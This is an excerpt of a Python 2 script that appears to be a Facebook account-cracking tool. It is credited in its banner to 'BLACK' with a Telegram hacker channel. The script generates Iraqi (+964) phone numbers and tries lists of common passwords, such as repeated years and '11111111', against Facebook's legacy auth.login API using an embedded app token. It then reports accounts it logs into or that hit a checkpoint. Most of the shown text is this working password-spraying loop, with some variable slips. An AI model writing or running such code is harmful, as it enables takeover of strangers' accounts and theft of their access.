...
def menu():
    ...
    print '\x1b[32m.'
    os.system('clear')
    os.system('figlet bnusa ;espeak -a 185 CODEK BNUSA')
    print '\x1b[97;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[99;1m'
    print '   Auther: BLACK\n   Chenall telegram: @BESTxHACKER\n   BNUSA :  123'
...
def action():
    ...
    if bch == '':
        ...
        os.system('clear')
        os.system('espeak -a 450 WELCOME..!')
        os.system('clear')
        print '\x1b[32m.'
        os.system('clear')
        ...
        try:
            k = '+964'
            c = raw_input('\x1b[95;1m SELECT NUMBER : ')
            idlist = '.txt'
        ...
        action()
    xxx = str(len(id))
    psb('\x1b[92;1m TOTAL NUMBER : ' + xxx)
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass2
            elif 'www.facebook.com' in q['error_msg']:
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass3
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass3
            else:
                pass4 = '112233445566'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass4
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass4
            else:
                pass5 = '20042004'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass5
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass5
            else:
                pass6 = '20052005'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass6
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass6
            else:
                pass7 = '20062006'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass7
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass7
            else:
                pass8 = '20032003'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass8
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass8
            else:
                pass9 = '20022002'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass9
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass9
            else:
                pass10 = '20002000'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass10
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass10
            else:
                pass11 = '19991999'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass11
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass11
            else:
                pass12 = '11111111'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass12
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass12                 
            else:
                pass12 = '88888888'
            ...
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass13
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass13
        except:
            pass
